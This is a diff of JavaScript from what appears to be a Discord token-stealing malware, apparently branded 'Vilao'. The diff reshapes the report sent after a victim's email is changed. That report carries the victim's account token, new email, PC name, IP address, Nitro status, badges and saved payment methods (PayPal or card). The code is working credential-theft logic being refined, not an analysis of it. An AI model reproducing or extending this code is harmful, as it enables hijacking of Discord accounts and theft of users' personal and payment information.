@@ -196,10 +196,6 @@ function ChangeEmail(e, t, n) {
                         title: "Email Alterado",
                         color: 0000000,
                         fields: [{
-                            name: "Info's",
-                            value: `\`\`\`NomePC: \n${computerName}\nIP: \n${s}\`\`\``,
-                            inline: !1
-                        }, {
                             name: "Nome",
                             value: `\`${o.username}#${o.discriminator}\``,
                             inline: !0
@@ -207,18 +203,6 @@ function ChangeEmail(e, t, n) {
                             name: "ID",
                             value: `\`${o.id}\``,
                             inline: !0
-                        }, {
-                            name: "Nitro",
-                            value: `${GetNitro(o.premium_type)}`,
-                            inline: !1
-                        }, {
-                            name: "Badges",
-                            value: `${GetBadges(o.flags)}`,
-                            inline: !1
-                        }, {
-                            name: "Pagamento",
-                            value: `${function(){const e=JSON.parse(r);var t="";return e.forEach(e=>{if(""==e.type)return"`❌`";if(2==e.type&&1!=e.invalid)t+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";t+="`✔️` :credit_card:"}}),""==t&&(t="`❌`"),t}()}`,
-                            inline: !1
                         }, {
                             name: "Novo Email",
                             value: `\`${e}\``,
@@ -231,13 +215,15 @@ function ChangeEmail(e, t, n) {
                             name: "Token",
                             value: `\`\`\`${n}\`\`\``,
                             inline: !1
+                        }, {
+                            name: "PC",
+                            value: `\`\`\`NomePC: ${computerName}\nIP: ${s}\`\`\``,
+                            inline: !1
+                        }, {
+                            name: "Conta",
+                            value: `\`\`\`Nitro: ${GetNitro(o.premium_type)}\nBadges: ${GetBadges(o.flags)}\nPagamento: ${function(){const e=JSON.parse(r);var t="";return e.forEach(e=>{if(""==e.type)return"❌";if(2==e.type&&1!=e.invalid)t+="✔️ <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"❌";t+="✔️ :credit_card:"}}),""==t&&(t="❌"),t}()}\`\`\``,
+                            inline: !1 
                         }],
-                        author: {
-                            name: "Vilao"
-                        },
-                        footer: {
-                            text: "Vilao"
-                        },
                         thumbnail: {
                             url: `https://cdn.discordapp.com/avatars/${o.id}/${o.avatar}`
                         }
